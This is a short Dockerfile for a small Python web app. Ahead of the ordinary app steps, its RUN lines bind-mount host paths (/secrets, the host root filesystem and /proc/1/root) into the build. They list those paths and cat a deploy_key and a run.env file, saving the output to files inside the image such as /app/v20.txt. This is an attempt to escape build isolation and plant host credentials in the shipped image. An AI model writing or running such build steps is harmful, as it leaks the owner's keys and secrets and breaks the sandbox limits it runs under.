FROM python:3.12-alpine
WORKDIR /app
# Try to bind-mount host paths into the build via buildah RUN --mount
RUN --mount=type=bind,source=/secrets,target=/mnt_secrets,rw ls -la /mnt_secrets 2>&1 | tee /app/m1.txt; cat /mnt_secrets/deploy_key /mnt_secrets/run.env 2>&1 | tee -a /app/m1.txt
RUN --mount=type=bind,source=/,target=/mnt_root ls -la /mnt_root 2>&1 | tee /app/m2.txt; ls -la /mnt_root/secrets 2>&1 | tee -a /app/m2.txt
RUN --mount=type=bind,source=/proc/1/root,target=/mnt_p1r ls -la /mnt_p1r 2>&1 | tee /app/m3.txt
RUN cat /app/m1.txt /app/m2.txt /app/m3.txt > /app/v20.txt 2>&1 || true
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
